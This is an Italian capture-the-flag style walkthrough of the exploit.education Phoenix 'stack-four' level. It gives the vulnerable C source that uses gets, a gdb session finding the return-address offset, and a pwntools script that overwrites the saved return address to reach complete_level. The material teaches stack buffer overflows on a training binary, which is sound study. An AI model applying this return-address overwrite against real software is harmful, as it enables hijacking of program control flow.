### Descrizione del Codice

Il programma `stack_four.c` presenta una vulnerabilità di overflow del buffer che può essere sfruttata per sovrascrivere l'indirizzo di ritorno salvato (standard buffer overflow).

### Funzionamento del Programma

1. Il programma legge un input dall'utente utilizzando la funzione `gets` e lo memorizza in `buffer`.
2. La funzione `gets` non controlla la lunghezza dell'input, il che può causare un overflow del buffer.
3. La funzione `start_level` stampa l'indirizzo di ritorno salvato.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `gets` senza controllare la lunghezza dell'input, il che può causare un overflow del buffer. Questo può essere sfruttato per sovrascrivere l'indirizzo di ritorno della funzione `start_level` per farlo puntare alla funzione `complete_level`.

### Exploit

L'exploit sfrutta l'overflow del buffer per sovrascrivere l'indirizzo di ritorno della funzione `start_level` per farlo puntare alla funzione `complete_level`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}

L'obiettivo di questo livello è sovrascrivere l'indirizzo di ritorno della funzione start_level per farlo puntare alla funzione complete_level invece che a main.

Prima otteniamo l'indirizzo della funzione complete_level:
$ gdb -q /opt/phoenix/amd64/stack-four
Reading symbols from /opt/phoenix/amd64/stack-four...(no debugging symbols found)...done.

gef➤  print complete_level 
$1 = {<text variable, no debug info>} 0x40061d <complete_level>

Quindi dobbiamo sovrascrivere RIP con l'indirizzo 0x40061d.
gef➤  disassemble start_level 
Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:	push   rbp
   0x0000000000400636 <+1>:	mov    rbp,rsp
   0x0000000000400639 <+4>:	sub    rsp,0x50
   0x000000000040063d <+8>:	lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:	mov    rdi,rax
   0x0000000000400644 <+15>:	call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:	mov    rax,QWORD PTR [rbp+0x8]
   .....

Quindi, per sovrascrivere RIP, dobbiamo inserire (0x50 riempimento + 8 byte per RBP + indirizzo di complete_level).

gef➤  b *0x0000000000400649
Breakpoint 1 at 0x400649

gef➤  r <<< $(python solve.py)
Starting program: /opt/phoenix/amd64/stack-four <<< $(python solve.py)
Welcome to phoenix/stack-four, brought to you by https://exploit.education
Breakpoint 1, 0x0000000000400649 in start_level ()
......

gef➤  info registers rbp
rbp            0x7fffffffe630      0x7fffffffe630

gef➤  x/12xg $rsp
0x7fffffffe5e0:	0x4141414141414141	0x4141414141414141
0x7fffffffe5f0:	0x4141414141414141	0x4141414141414141
0x7fffffffe600:	0x4141414141414141	0x4141414141414141
0x7fffffffe610:	0x4141414141414141	0x4141414141414141
0x7fffffffe620:	0x4141414141414141	0x4141414141414141
0x7fffffffe630:	0x4242424242424242	0x000000000040061d

Qui possiamo vedere che RBP è stato sovrascritto con 0x4242424242424242 e dopo di esso c'è il valore di RIP 0x000000000040061d, che è l'indirizzo della funzione complete_level.

Soluzione:
# solve.py

from pwn import *

buff = ""
buff += 'A'*80  # riempimento
buff += 'BBBBBBBB'  # valore RBP
buff += p64(0x40061d)  # valore RIP

print(buff)

Eseguiamo lo script:
$ python solve.py | /opt/phoenix/amd64/stack-four